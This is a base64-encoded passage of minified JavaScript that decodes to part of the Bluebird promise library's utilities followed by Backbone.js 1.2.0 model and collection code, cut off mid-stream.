KX1mdW5jdGlvbiBtKGUsdCxuKXtmb3IodmFyIHI9bmV3IEFycmF5KGUpLGk9MDtlPmk7KytpKXJbaV09dCtpK247cmV0dXJuIHJ9ZnVuY3Rpb24geShlKXt0cnl7cmV0dXJuIGUrIiJ9Y2F0Y2godCl7cmV0dXJuIltubyBzdHJpbmcgcmVwcmVzZW50YXRpb25dIn19ZnVuY3Rpb24gZyhlKXt0cnl7ZChlLCJpc09wZXJhdGlvbmFsIiwhMCl9Y2F0Y2godCl7fX1mdW5jdGlvbiB2KGUpe3JldHVybiBudWxsPT1lPyExOmUgaW5zdGFuY2VvZiBFcnJvci5fX0JsdWViaXJkRXJyb3JUeXBlc19fLk9wZXJhdGlvbmFsRXJyb3J8fGUuaXNPcGVyYXRpb25hbD09PSEwfWZ1bmN0aW9uIGIoZSl7cmV0dXJuIGUgaW5zdGFuY2VvZiBFcnJvciYmay5wcm9wZXJ0eUlzV3JpdGFibGUoZSwic3RhY2siKX1mdW5jdGlvbiBNKGUpe3JldHVybnt9LnRvU3RyaW5nLmNhbGwoZSl9ZnVuY3Rpb24gTChlLHQsbil7Zm9yKHZhciByPWsubmFtZXMoZSksaT0wO2k8ci5sZW5ndGg7KytpKXt2YXIgcz1yW2ldO2lmKG4ocykpdHJ5e2suZGVmaW5lUHJvcGVydHkodCxzLGsuZ2V0RGVzY3JpcHRvcihlLHMpKX1jYXRjaChvKXt9fX12YXIgaz1lKCIuL2VzNS5qcyIpLHc9InVuZGVmaW5lZCI9PXR5cGVvZiBuYXZpZ2F0b3IsVD1mdW5jdGlvbigpe3RyeXt2YXIgZT17fTtyZXR1cm4gay5kZWZpbmVQcm9wZXJ0eShlLCJmIix7Z2V0OmZ1bmN0aW9uKCl7cmV0dXJuIDN9fSksMz09PWUuZn1jYXRjaCh0KXtyZXR1cm4hMX19KCksWT17ZTp7fX0sRCxTPWZ1bmN0aW9uKGUsdCl7ZnVuY3Rpb24gbigpe3RoaXMuY29uc3RydWN0b3I9ZSx0aGlzLmNvbnN0cnVjdG9yJD10O2Zvcih2YXIgbiBpbiB0LnByb3RvdHlwZSlyLmNhbGwodC5wcm90b3R5cGUsbikmJiIkIiE9PW4uY2hhckF0KG4ubGVuZ3RoLTEpJiYodGhpc1tuKyIkIl09dC5wcm90b3R5cGVbbl0pfXZhciByPXt9Lmhhc093blByb3BlcnR5O3JldHVybiBuLnByb3RvdHlwZT10LnByb3RvdHlwZSxlLnByb3RvdHlwZT1uZXcgbixlLnByb3RvdHlwZX0seD1mdW5jdGlvbigpe3ZhciBlPVtBcnJheS5wcm90b3R5cGUsT2JqZWN0LnByb3RvdHlwZSxGdW5jdGlvbi5wcm90b3R5cGVdLHQ9ZnVuY3Rpb24odCl7Zm9yKHZhciBuPTA7bjxlLmxlbmd0aDsrK24paWYoZVtuXT09PXQpcmV0dXJuITA7cmV0dXJuITF9O2lmKGsuaXNFUzUpe3ZhciBuPU9iamVjdC5nZXRPd25Qcm9wZXJ0eU5hbWVzO3JldHVybiBmdW5jdGlvbihlKXtmb3IodmFyIHI9W10saT1PYmplY3QuY3JlYXRlKG51bGwpO251bGwhPWUmJiF0KGUpOyl7dmFyIHM7dHJ5e3M9bihlKX1jYXRjaChvKXtyZXR1cm4gcn1mb3IodmFyIGE9MDthPHMubGVuZ3RoOysrYSl7dmFyIHU9c1thXTtpZighaVt1XSl7aVt1XT0hMDt2YXIgYz1PYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKGUsdSk7bnVsbCE9YyYmbnVsbD09Yy5nZXQmJm51bGw9PWMuc2V0JiZyLnB1c2godSl9fWU9ay5nZXRQcm90b3R5cGVPZihlKX1yZXR1cm4gcn19dmFyIHI9e30uaGFzT3duUHJvcGVydHk7cmV0dXJuIGZ1bmN0aW9uKG4pe2lmKHQobikpcmV0dXJuW107dmFyIGk9W107ZTpmb3IodmFyIHMgaW4gbilpZihyLmNhbGwobixzKSlpLnB1c2gocyk7ZWxzZXtmb3IodmFyIG89MDtvPGUubGVuZ3RoOysrbylpZihyLmNhbGwoZVtvXSxzKSljb250aW51ZSBlO2kucHVzaChzKX1yZXR1cm4gaX19KCksaj0vdGhpc1xzKlwuXHMqXFMrXHMqPS8sSD0vXlthLXokX11bYS16JF8wLTldKiQvaSxQPWZ1bmN0aW9uKCl7cmV0dXJuInN0YWNrImluIG5ldyBFcnJvcj9mdW5jdGlvbihlKXtyZXR1cm4gYihlKT9lOm5ldyBFcnJvcih5KGUpKX06ZnVuY3Rpb24oZSl7aWYoYihlKSlyZXR1cm4gZTt0cnl7dGhyb3cgbmV3IEVycm9yKHkoZSkpfWNhdGNoKHQpe3JldHVybiB0fX19KCksRT17aXNDbGFzczpmLGlzSWRlbnRpZmllcjpfLGluaGVyaXRlZERhdGFLZXlzOngsZ2V0RGF0YVByb3BlcnR5T3JEZWZhdWx0OmwsdGhyb3dlcjpoLGlzQXJyYXk6ay5pc0FycmF5LGhhdmVHZXR0ZXJzOlQsbm90RW51bWVyYWJsZVByb3A6ZCxpc1ByaW1pdGl2ZTpvLGlzT2JqZWN0OmEsY2FuRXZhbHVhdGU6dyxlcnJvck9iajpZLHRyeUNhdGNoOnMsaW5oZXJpdHM6Uyx3aXRoQXBwZW5kZWQ6YyxtYXliZVdyYXBBc0Vycm9yOnUsdG9GYXN0UHJvcGVydGllczpwLGZpbGxlZFJhbmdlOm0sdG9TdHJpbmc6eSxjYW5BdHRhY2hUcmFjZTpiLGVuc3VyZUVycm9yT2JqZWN0OlAsb3JpZ2luYXRlc0Zyb21SZWplY3Rpb246dixtYXJrQXNPcmlnaW5hdGluZ0Zyb21SZWplY3Rpb246ZyxjbGFzc1N0cmluZzpNLGNvcHlEZXNjcmlwdG9yczpMLGhhc0RldlRvb2xzOiJ1bmRlZmluZWQiIT10eXBlb2YgY2hyb21lJiZjaHJvbWUmJiJmdW5jdGlvbiI9PXR5cGVvZiBjaHJvbWUubG9hZFRpbWVzLGlzTm9kZToidW5kZWZpbmVkIiE9dHlwZW9mIHQmJiJbb2JqZWN0IHByb2Nlc3NdIj09PU0odCkudG9Mb3dlckNhc2UoKX07RS5pc1JlY2VudE5vZGU9RS5pc05vZGUmJmZ1bmN0aW9uKCl7dmFyIGU9dC52ZXJzaW9ucy5ub2RlLnNwbGl0KCIuIikubWFwKE51bWJlcik7cmV0dXJuIDA9PT1lWzBdJiZlWzFdPjEwfHxlWzBdPjB9KCksRS5pc05vZGUmJkUudG9GYXN0UHJvcGVydGllcyh0KTt0cnl7dGhyb3cgbmV3IEVycm9yfWNhdGNoKEYpe0UubGFzdExpbmVFcnJvcj1GfW4uZXhwb3J0cz1FfSx7Ii4vZXM1LmpzIjoxNH1dfSx7fSxbNF0pKDQpfSksInVuZGVmaW5lZCIhPXR5cGVvZiB3aW5kb3cmJm51bGwhPT13aW5kb3c/d2luZG93LlA9d2luZG93LlByb21pc2U6InVuZGVmaW5lZCIhPXR5cGVvZiBzZWxmJiZudWxsIT09c2VsZiYmKHNlbGYuUD1zZWxmLlByb21pc2UpfSkuY2FsbCh0LG4oMiksZnVuY3Rpb24oKXtyZXR1cm4gdGhpc30oKSxuKDIxKS5zZXRJbW1lZGlhdGUpfQ0KLyogQmx1ZUJpcmQgLS0+ICovDQosLCwsDQovKiA8IS0tIE1WQyBoZWxwZXIgZnVuY3Rpb25zICovDQpmdW5jdGlvbihlLHQsbil7dmFyIHIsaTsoZnVuY3Rpb24ocyl7IWZ1bmN0aW9uKG8pe3ZhciBhPSJvYmplY3QiPT10eXBlb2Ygc2VsZiYmc2VsZi5zZWxmPT1zZWxmJiZzZWxmfHwib2JqZWN0Ij09dHlwZW9mIHMmJnMuZ2xvYmFsPT1zJiZzO3I9W24oOCksbigxNjApLHRdLGk9ZnVuY3Rpb24oZSx0LG4pe2EuQmFja2JvbmU9byhhLG4sZSx0KX0uYXBwbHkodCxyKSwhKHZvaWQgMCE9PWkmJihlLmV4cG9ydHM9aSkpfShmdW5jdGlvbihlLHQsbixyKXt2YXIgaT1lLkJhY2tib25lLHM9W10sbz1zLnNsaWNlO3QuVkVSU0lPTj0iMS4yLjAiLHQuJD1yLHQubm9Db25mbGljdD1mdW5jdGlvbigpe3JldHVybiBlLkJhY2tib25lPWksdGhpc30sdC5lbXVsYXRlSFRUUD0hMSx0LmVtdWxhdGVKU09OPSExO3ZhciBhPXQuRXZlbnRzPXt9LHU9L1xzKy8sYz1mdW5jdGlvbihlLHQscixpLHMpe3ZhciBvLGE9MDtpZihyJiYib2JqZWN0Ij09dHlwZW9mIHIpZm9yKG89bi5rZXlzKHIpO2E8by5sZW5ndGg7YSsrKXQ9ZSh0LG9bYV0scltvW2FdXSxzKTtlbHNlIGlmKHImJnUudGVzdChyKSlmb3Iobz1yLnNwbGl0KHUpO2E8by5sZW5ndGg7YSsrKXQ9ZSh0LG9bYV0saSxzKTtlbHNlIHQ9ZSh0LHIsaSxzKTtyZXR1cm4gdH07YS5vbj1mdW5jdGlvbihlLHQsbil7cmV0dXJuIGwodGhpcyxlLHQsbil9O3ZhciBsPWZ1bmN0aW9uKGUsdCxuLHIsaSl7aWYoZS5fZXZlbnRzPWMoZCxlLl9ldmVudHN8fHt9LHQsbix7Y29udGV4dDpyLGN0eDplLGxpc3RlbmluZzppfSksaSl7dmFyIHM9ZS5fbGlzdGVuZXJzfHwoZS5fbGlzdGVuZXJzPXt9KTtzW2kuaWRdPWl9cmV0dXJuIGV9O2EubGlzdGVuVG89ZnVuY3Rpb24oZSx0LHIpe2lmKCFlKXJldHVybiB0aGlzO3ZhciBpPWUuX2xpc3RlbklkfHwoZS5fbGlzdGVuSWQ9bi51bmlxdWVJZCgibCIpKSxzPXRoaXMuX2xpc3RlbmluZ1RvfHwodGhpcy5fbGlzdGVuaW5nVG89e30pLG89c1tpXTtpZighbyl7dmFyIGE9dGhpcy5fbGlzdGVuSWR8fCh0aGlzLl9saXN0ZW5JZD1uLnVuaXF1ZUlkKCJsIikpO289c1tpXT17b2JqOmUsb2JqSWQ6aSxpZDphLGxpc3RlbmluZ1RvOnMsY291bnQ6MH19cmV0dXJuIGwoZSx0LHIsdGhpcyxvKSx0aGlzfTt2YXIgZD1mdW5jdGlvbihlLHQsbixyKXtpZihuKXt2YXIgaT1lW3RdfHwoZVt0XT1bXSkscz1yLmNvbnRleHQsbz1yLmN0eCxhPXIubGlzdGVuaW5nO2EmJmEuY291bnQrKyxpLnB1c2goe2NhbGxiYWNrOm4sY29udGV4dDpzLGN0eDpzfHxvLGxpc3RlbmluZzphfSl9cmV0dXJuIGV9O2Eub2ZmPWZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gdGhpcy5fZXZlbnRzPyh0aGlzLl9ldmVudHM9YyhoLHRoaXMuX2V2ZW50cyxlLHQse2NvbnRleHQ6bixsaXN0ZW5lcnM6dGhpcy5fbGlzdGVuZXJzfSksdGhpcyk6dGhpc30sYS5zdG9wTGlzdGVuaW5nPWZ1bmN0aW9uKGUsdCxyKXt2YXIgaT10aGlzLl9saXN0ZW5pbmdUbztpZighaSlyZXR1cm4gdGhpcztmb3IodmFyIHM9ZT9bZS5fbGlzdGVuSWRdOm4ua2V5cyhpKSxvPTA7bzxzLmxlbmd0aDtvKyspe3ZhciBhPWlbc1tvXV07aWYoIWEpYnJlYWs7YS5vYmoub2ZmKHQscix0aGlzKX1yZXR1cm4gbi5pc0VtcHR5KGkpJiYodGhpcy5fbGlzdGVuaW5nVG89dm9pZCAwKSx0aGlzfTt2YXIgaD1mdW5jdGlvbihlLHQscixpKXtpZihlKXt2YXIgcyxvPTAsYT1pLmNvbnRleHQsdT1pLmxpc3RlbmVycztpZih0fHxyfHxhKXtmb3IodmFyIGM9dD9bdF06bi5rZXlzKGUpO288Yy5sZW5ndGg7bysrKXt0PWNbb107dmFyIGw9ZVt0XTtpZighbClicmVhaztmb3IodmFyIGQ9W10saD0wO2g8bC5sZW5ndGg7aCsrKXt2YXIgZj1sW2hdO3ImJnIhPT1mLmNhbGxiYWNrJiZyIT09Zi5jYWxsYmFjay5fY2FsbGJhY2t8fGEmJmEhPT1mLmNvbnRleHQ/ZC5wdXNoKGYpOihzPWYubGlzdGVuaW5nLHMmJjA9PT0tLXMuY291bnQmJihkZWxldGUgdVtzLmlkXSxkZWxldGUgcy5saXN0ZW5pbmdUb1tzLm9iaklkXSkpfWQubGVuZ3RoP2VbdF09ZDpkZWxldGUgZVt0XX1yZXR1cm4gbi5zaXplKGUpP2U6dm9pZCAwfWZvcih2YXIgcD1uLmtleXModSk7bzxwLmxlbmd0aDtvKyspcz11W3Bbb11dLGRlbGV0ZSB1W3MuaWRdLGRlbGV0ZSBzLmxpc3RlbmluZ1RvW3Mub2JqSWRdfX07YS5vbmNlPWZ1bmN0aW9uKGUsdCxyKXt2YXIgaT1jKGYse30sZSx0LG4uYmluZCh0aGlzLm9mZix0aGlzKSk7cmV0dXJuIHRoaXMub24oaSx2b2lkIDAscil9LGEubGlzdGVuVG9PbmNlPWZ1bmN0aW9uKGUsdCxyKXt2YXIgaT1jKGYse30sdCxyLG4uYmluZCh0aGlzLnN0b3BMaXN0ZW5pbmcsdGhpcyxlKSk7cmV0dXJuIHRoaXMubGlzdGVuVG8oZSxpKX07dmFyIGY9ZnVuY3Rpb24oZSx0LHIsaSl7aWYocil7dmFyIHM9ZVt0XT1uLm9uY2UoZnVuY3Rpb24oKXtpKHQscyksci5hcHBseSh0aGlzLGFyZ3VtZW50cyl9KTtzLl9jYWxsYmFjaz1yfXJldHVybiBlfTthLnRyaWdnZXI9ZnVuY3Rpb24oZSl7aWYoIXRoaXMuX2V2ZW50cylyZXR1cm4gdGhpcztmb3IodmFyIHQ9TWF0aC5tYXgoMCxhcmd1bWVudHMubGVuZ3RoLTEpLG49QXJyYXkodCkscj0wO3Q+cjtyKyspbltyXT1hcmd1bWVudHNbcisxXTtyZXR1cm4gYyhwLHRoaXMuX2V2ZW50cyxlLHZvaWQgMCxuKSx0aGlzfTt2YXIgcD1mdW5jdGlvbihlLHQsbixyKXtpZihlKXt2YXIgaT1lW3RdLHM9ZS5hbGw7aSYmcyYmKHM9cy5zbGljZSgpKSxpJiZfKGkscikscyYmXyhzLFt0XS5jb25jYXQocikpfXJldHVybiBlfSxfPWZ1bmN0aW9uKGUsdCl7dmFyIG4scj0tMSxpPWUubGVuZ3RoLHM9dFswXSxvPXRbMV0sYT10WzJdO3N3aXRjaCh0Lmxlbmd0aCl7Y2FzZSAwOmZvcig7KytyPGk7KShuPWVbcl0pLmNhbGxiYWNrLmNhbGwobi5jdHgpO3JldHVybjtjYXNlIDE6Zm9yKDsrK3I8aTspKG49ZVtyXSkuY2FsbGJhY2suY2FsbChuLmN0eCxzKTtyZXR1cm47Y2FzZSAyOmZvcig7KytyPGk7KShuPWVbcl0pLmNhbGxiYWNrLmNhbGwobi5jdHgscyxvKTtyZXR1cm47Y2FzZSAzOmZvcig7KytyPGk7KShuPWVbcl0pLmNhbGxiYWNrLmNhbGwobi5jdHgscyxvLGEpO3JldHVybjtkZWZhdWx0OmZvcig7KytyPGk7KShuPWVbcl0pLmNhbGxiYWNrLmFwcGx5KG4uY3R4LHQpO3JldHVybn19LG09ZnVuY3Rpb24oZSx0LHIpe3N3aXRjaChlKXtjYXNlIDE6cmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIG5bdF0odGhpc1tyXSl9O2Nhc2UgMjpyZXR1cm4gZnVuY3Rpb24oZSl7cmV0dXJuIG5bdF0odGhpc1tyXSxlKX07Y2FzZSAzOnJldHVybiBmdW5jdGlvbihlLGkpe3JldHVybiBuW3RdKHRoaXNbcl0sZSxpKX07Y2FzZSA0OnJldHVybiBmdW5jdGlvbihlLGkscyl7cmV0dXJuIG5bdF0odGhpc1tyXSxlLGkscyl9O2RlZmF1bHQ6cmV0dXJuIGZ1bmN0aW9uKCl7dmFyIGU9by5jYWxsKGFyZ3VtZW50cyk7cmV0dXJuIGUudW5zaGlmdCh0aGlzW3JdKSxuW3RdLmFwcGx5KG4sZSl9fX0seT1mdW5jdGlvbihlLHQscil7bi5lYWNoKHQsZnVuY3Rpb24odCxpKXtuW2ldJiYoZS5wcm90b3R5cGVbaV09bSh0LGkscikpfSl9O2EuYmluZD1hLm9uLGEudW5iaW5kPWEub2ZmLG4uZXh0ZW5kKHQsYSk7dmFyIGc9dC5Nb2RlbD1mdW5jdGlvbihlLHQpe3ZhciByPWV8fHt9O3R8fCh0PXt9KSx0aGlzLmNpZD1uLnVuaXF1ZUlkKHRoaXMuY2lkUHJlZml4KSx0aGlzLmF0dHJpYnV0ZXM9e30sdC5jb2xsZWN0aW9uJiYodGhpcy5jb2xsZWN0aW9uPXQuY29sbGVjdGlvbiksdC5wYXJzZSYmKHI9dGhpcy5wYXJzZShyLHQpfHx7fSkscj1uLmRlZmF1bHRzKHt9LHIsbi5yZXN1bHQodGhpcywiZGVmYXVsdHMiKSksdGhpcy5zZXQocix0KSx0aGlzLmNoYW5nZWQ9e30sdGhpcy5pbml0aWFsaXplLmFwcGx5KHRoaXMsYXJndW1lbnRzKX07bi5leHRlbmQoZy5wcm90b3R5cGUsYSx7Y2hhbmdlZDpudWxsLHZhbGlkYXRpb25FcnJvcjpudWxsLGlkQXR0cmlidXRlOiJpZCIsY2lkUHJlZml4OiJjIixpbml0aWFsaXplOmZ1bmN0aW9uKCl7fSx0b0pTT046ZnVuY3Rpb24oZSl7cmV0dXJuIG4uY2xvbmUodGhpcy5hdHRyaWJ1dGVzKX0sc3luYzpmdW5jdGlvbigpe3JldHVybiB0LnN5bmMuYXBwbHkodGhpcyxhcmd1bWVudHMpfSxnZXQ6ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuYXR0cmlidXRlc1tlXX0sZXNjYXBlOmZ1bmN0aW9uKGUpe3JldHVybiBuLmVzY2FwZSh0aGlzLmdldChlKSl9LGhhczpmdW5jdGlvbihlKXtyZXR1cm4gbnVsbCE9dGhpcy5nZXQoZSl9LG1hdGNoZXM6ZnVuY3Rpb24oZSl7cmV0dXJuISFuLml0ZXJhdGVlKGUsdGhpcykodGhpcy5hdHRyaWJ1dGVzKX0sc2V0OmZ1bmN0aW9uKGUsdCxyKXt2YXIgaSxzLG8sYSx1LGMsbCxkO2lmKG51bGw9PWUpcmV0dXJuIHRoaXM7aWYoIm9iamVjdCI9PXR5cGVvZiBlPyhzPWUscj10KToocz17fSlbZV09dCxyfHwocj17fSksIXRoaXMuX3ZhbGlkYXRlKHMscikpcmV0dXJuITE7bz1yLnVuc2V0LHU9ci5zaWxlbnQsYT1bXSxjPXRoaXMuX2NoYW5naW5nLHRoaXMuX2NoYW5naW5nPSEwLGN8fCh0aGlzLl9wcmV2aW91c0F0dHJpYnV0ZXM9bi5jbG9uZSh0aGlzLmF0dHJpYnV0ZXMpLHRoaXMuY2hhbmdlZD17fSksZD10aGlzLmF0dHJpYnV0ZXMsbD10aGlzLl9wcmV2aW91c0F0dHJpYnV0ZXMsdGhpcy5pZEF0dHJpYnV0ZSBpbiBzJiYodGhpcy5pZD1zW3RoaXMuaWRBdHRyaWJ1dGVdKTtmb3IoaSBpbiBzKXQ9c1tpXSxuLmlzRXF1YWwoZFtpXSx0KXx8YS5wdXNoKGkpLG4uaXNFcXVhbChsW2ldLHQpP2RlbGV0ZSB0aGlzLmNoYW5nZWRbaV06dGhpcy5jaGFuZ2VkW2ldPXQsbz9kZWxldGUgZFtpXTpkW2ldPXQ7aWYoIXUpe2EubGVuZ3RoJiYodGhpcy5fcGVuZGluZz1yKTtmb3IodmFyIGg9MDtoPGEubGVuZ3RoO2grKyl0aGlzLnRyaWdnZXIoImNoYW5nZToiK2FbaF0sdGhpcyxkW2FbaF1dLHIpfWlmKGMpcmV0dXJuIHRoaXM7aWYoIXUpZm9yKDt0aGlzLl9wZW5kaW5nOylyPXRoaXMuX3BlbmRpbmcsdGhpcy5fcGVuZGluZz0hMSx0aGlzLnRyaWdnZXIoImNoYW5nZSIsdGhpcyxyKTtyZXR1cm4gdGhpcy5fcGVuZGluZz0hMSx0aGlzLl9jaGFuZ2luZz0hMSx0aGlzfSx1bnNldDpmdW5jdGlvbihlLHQpe3JldHVybiB0aGlzLnNldChlLHZvaWQgMCxuLmV4dGVuZCh7fSx0LHt1bnNldDohMH0pKX0sY2xlYXI6ZnVuY3Rpb24oZSl7dmFyIHQ9e307Zm9yKHZhciByIGluIHRoaXMuYXR0cmlidXRlcyl0W3JdPXZvaWQgMDtyZXR1cm4gdGhpcy5zZXQodCxuLmV4dGVuZCh7fSxlLHt1bnNldDohMH0pKX0saGFzQ2hhbmdlZDpmdW5jdGlvbihlKXtyZXR1cm4gbnVsbD09ZT8hbi5pc0VtcHR5KHRoaXMuY2hhbmdlZCk6bi5oYXModGhpcy5jaGFuZ2VkLGUpfSxjaGFuZ2VkQXR0cmlidXRlczpmdW5jdGlvbihlKXtpZighZSlyZXR1cm4gdGhpcy5oYXNDaGFuZ2VkKCk/bi5jbG9uZSh0aGlzLmNoYW5nZWQpOiExO3ZhciB0LHI9ITEsaT10aGlzLl9jaGFuZ2luZz90aGlzLl9wcmV2aW91c0F0dHJpYnV0ZXM6dGhpcy5hdHRyaWJ1dGVzO2Zvcih2YXIgcyBpbiBlKW4uaXNFcXVhbChpW3NdLHQ9ZVtzXSl8fCgocnx8KHI9e30pKVtzXT10KTtyZXR1cm4gcn0scHJldmlvdXM6ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGwhPWUmJnRoaXMuX3ByZXZpb3VzQXR0cmlidXRlcz90aGlzLl9wcmV2aW91c0F0dHJpYnV0ZXNbZV06bnVsbH0scHJldmlvdXNBdHRyaWJ1dGVzOmZ1bmN0aW9uKCl7cmV0dXJuIG4uY2xvbmUodGhpcy5fcHJldmlvdXNBdHRyaWJ1dGVzKX0sZmV0Y2g6ZnVuY3Rpb24oZSl7ZT1lP24uY2xvbmUoZSk6e30sdm9pZCAwPT09ZS5wYXJzZSYmKGUucGFyc2U9ITApO3ZhciB0PXRoaXMscj1lLnN1Y2Nlc3M7cmV0dXJuIGUuc3VjY2Vzcz1mdW5jdGlvbihuKXtyZXR1cm4gdC5zZXQodC5wYXJzZShuLGUpLGUpPyhyJiZyLmNhbGwoZS5jb250ZXh0LHQsbixlKSx2b2lkIHQudHJpZ2dlcigic3luYyIsdCxuLGUpKTohMX0sSSh0aGlzLGUpLHRoaXMuc3luYygicmVhZCIsdGhpcyxlKX0sc2F2ZTpmdW5jdGlvbihlLHQscil7dmFyIGkscyxvLGEsdT10aGlzLmF0dHJpYnV0ZXM7aWYobnVsbD09ZXx8Im9iamVjdCI9PXR5cGVvZiBlPyhpPWUscj10KTooaT17fSlbZV09dCxyPW4uZXh0ZW5kKHt2YWxpZGF0ZTohMH0sciksYT1yLndhaXQsaSYmIWEpe2lmKCF0aGlzLnNldChpLHIpKXJldHVybiExfWVsc2UgaWYoIXRoaXMuX3ZhbGlkYXRlKGkscikpcmV0dXJuITE7aSYmYSYmKHRoaXMuYXR0cmlidXRlcz1uLmV4dGVuZCh7fSx1LGkpKSx2b2lkIDA9PT1yLnBhcnNlJiYoci5wYXJzZT0hMCk7dmFyIGM9dGhpcyxsPXIuc3VjY2VzcztyZXR1cm4gci5zdWNjZXNzPWZ1bmN0aW9uKGUpe2MuYXR0cmlidXRlcz11O3ZhciB0PXIucGFyc2U/Yy5wYXJzZShlLHIpOmU7cmV0dXJuIGEmJih0PW4uZXh0ZW5kKGl8fHt9LHQpKSxuLmlzT2JqZWN0KHQpJiYhYy5zZXQodCxyKT8hMToobCYmbC5jYWxsKHIuY29udGV4dCxjLGUsciksdm9pZCBjLnRyaWdnZXIoInN5bmMiLGMsZSxyKSl9LEkodGhpcyxyKSxzPXRoaXMuaXNOZXcoKT8iY3JlYXRlIjpyLnBhdGNoPyJwYXRjaCI6InVwZGF0ZSIsInBhdGNoIiE9PXN8fHIuYXR0cnN8fChyLmF0dHJzPWkpLG89dGhpcy5zeW5jKHMsdGhpcyxyKSxpJiZhJiYodGhpcy5hdHRyaWJ1dGVzPXUpLG99LGRlc3Ryb3k6ZnVuY3Rpb24oZSl7ZT1lP24uY2xvbmUoZSk6e307dmFyIHQ9dGhpcyxyPWUuc3VjY2VzcyxpPWUud2FpdCxzPWZ1bmN0aW9uKCl7dC5zdG9wTGlzdGVuaW5nKCksdC50cmlnZ2VyKCJkZXN0cm95Iix0LHQuY29sbGVjdGlvbixlKX07ZS5zdWNjZXNzPWZ1bmN0aW9uKG4pe2kmJnMoKSxyJiZyLmNhbGwoZS5jb250ZXh0LHQsbixlKSx0LmlzTmV3KCl8fHQudHJpZ2dlcigic3luYyIsdCxuLGUpfTt2YXIgbz0hMTtyZXR1cm4gdGhpcy5pc05ldygpP24uZGVmZXIoZS5zdWNjZXNzKTooSSh0aGlzLGUpLG89dGhpcy5zeW5jKCJkZWxldGUiLHRoaXMsZSkpLGl8fHMoKSxvfSx1cmw6ZnVuY3Rpb24oKXt2YXIgZT1uLnJlc3VsdCh0aGlzLCJ1cmxSb290Iil8fG4ucmVzdWx0KHRoaXMuY29sbGVjdGlvbiwidXJsIil8fE4oKTtpZih0aGlzLmlzTmV3KCkpcmV0dXJuIGU7dmFyIHQ9dGhpcy5pZHx8dGhpcy5hdHRyaWJ1dGVzW3RoaXMuaWRBdHRyaWJ1dGVdO3JldHVybiBlLnJlcGxhY2UoLyhbXlwvXSkkLywiJDEvIikrZW5jb2RlVVJJQ29tcG9uZW50KHQpfSxwYXJzZTpmdW5jdGlvbihlLHQpe3JldHVybiBlfSxjbG9uZTpmdW5jdGlvbigpe3JldHVybiBuZXcgdGhpcy5jb25zdHJ1Y3Rvcih0aGlzLmF0dHJpYnV0ZXMpfSxpc05ldzpmdW5jdGlvbigpe3JldHVybiF0aGlzLmhhcyh0aGlzLmlkQXR0cmlidXRlKX0saXNWYWxpZDpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5fdmFsaWRhdGUoe30sbi5leHRlbmQoZXx8e30se3ZhbGlkYXRlOiEwfSkpfSxfdmFsaWRhdGU6ZnVuY3Rpb24oZSx0KXtpZighdC52YWxpZGF0ZXx8IXRoaXMudmFsaWRhdGUpcmV0dXJuITA7ZT1uLmV4dGVuZCh7fSx0aGlzLmF0dHJpYnV0ZXMsZSk7dmFyIHI9dGhpcy52YWxpZGF0aW9uRXJyb3I9dGhpcy52YWxpZGF0ZShlLHQpfHxudWxsO3JldHVybiByPyh0aGlzLnRyaWdnZXIoImludmFsaWQiLHRoaXMscixuLmV4dGVuZCh0LHt2YWxpZGF0aW9uRXJyb3I6cn0pKSwhMSk6ITB9fSk7dmFyIHY9e2tleXM6MSx2YWx1ZXM6MSxwYWlyczoxLGludmVydDoxLHBpY2s6MCxvbWl0OjAsY2hhaW46MSxpc0VtcHR5OjF9O3koZyx2LCJhdHRyaWJ1dGVzIik7dmFyIGI9dC5Db2xsZWN0aW9uPWZ1bmN0aW9uKGUsdCl7dHx8KHQ9e30pLHQubW9kZWwmJih0aGlzLm1vZGVsPXQubW9kZWwpLHZvaWQgMCE9PXQuY29tcGFyYXRvciYmKHRoaXMuY29tcGFyYXRvcj10LmNvbXBhcmF0b3IpLHRoaXMuX3Jlc2V0KCksdGhpcy5pbml0aWFsaXplLmFwcGx5KHRoaXMsYXJndW1lbnRzKSxlJiZ0aGlzLnJlc2V0KGUsbi5leHRlbmQoe3NpbGVudDohMH0sdCkpfSxNPXthZGQ6ITAscmVtb3ZlOiEwLG1lcmdlOiEwfSxMPXthZGQ6ITAscmVtb3ZlOiExfTtuLmV4dGVuZChiLnByb3RvdHlwZSxhLHttb2RlbDpnLGluaXRpYWxpemU6ZnVuY3Rpb24oKXt9LHRvSlNPTjpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5tYXAoZnVuY3Rpb24odCl7cmV0dXJuIHQudG9KU09OKGUpfSl9LHN5bmM6ZnVuY3Rpb24oKXtyZXR1cm4gdC5zeW5jLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0sYWRkOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMuc2V0KGUsbi5leHRlbmQoe21lcmdlOiExfSx0LEwpKX0scmVtb3ZlOmZ1bmN0aW9uKGUsdCl7dmFyIHIsaT0hbi5pc0FycmF5KGUpO3JldHVybiBlPWk/W2VdOm4uY2xvbmUoZSksdHx8KHQ9e30pLHI9dGhpcy5fcmVtb3ZlTW9kZWxzKGUsdCksIXQuc2lsZW50JiZyJiZ0aGlzLnRyaWdnZXIoInVwZGF0ZSIsdGhpcyx0KSxpP2VbMF06ZX0sc2V0OmZ1bmN0aW9uKGUsdCl7dD1uLmRlZmF1bHRzKHt9LHQsTSksdC5wYXJzZSYmKGU9dGhpcy5wYXJzZShlLHQpKTt2YXIgcj0hbi5pc0FycmF5KGUpO2U9cj9lP1tlXTpbXTplLnNsaWNlKCk7dmFyIGkscyxvLGEsdSxjPXQuYXQ7bnVsbCE9YyYmKGM9K2MpLDA+YyYmKGMrPXRoaXMubGVuZ3RoKzEpO2Zvcih2YXIgbD10aGlzLmNvbXBhcmF0b3ImJm51bGw9PWMmJnQuc29ydCE9PSExLGQ9bi5pc1N0cmluZyh0aGlzLmNvbXBhcmF0b3IpP3RoaXMuY29tcGFyYXRvcjpudWxsLGg9W10sZj1bXSxwPXt9LF89dC5hZGQsbT10Lm1lcmdlLHk9dC5yZW1vdmUsZz0hbCYmXyYmeT9bXTohMSx2PSExLGI9MDtiPGUubGVuZ3RoO2IrKyl7aWYobz1lW2JdLGE9dGhpcy5nZXQobykpeSYmKHBbYS5jaWRdPSEwKSxtJiZvIT09YSYmKG89dGhpcy5faXNNb2RlbChvKT9vLmF0dHJpYnV0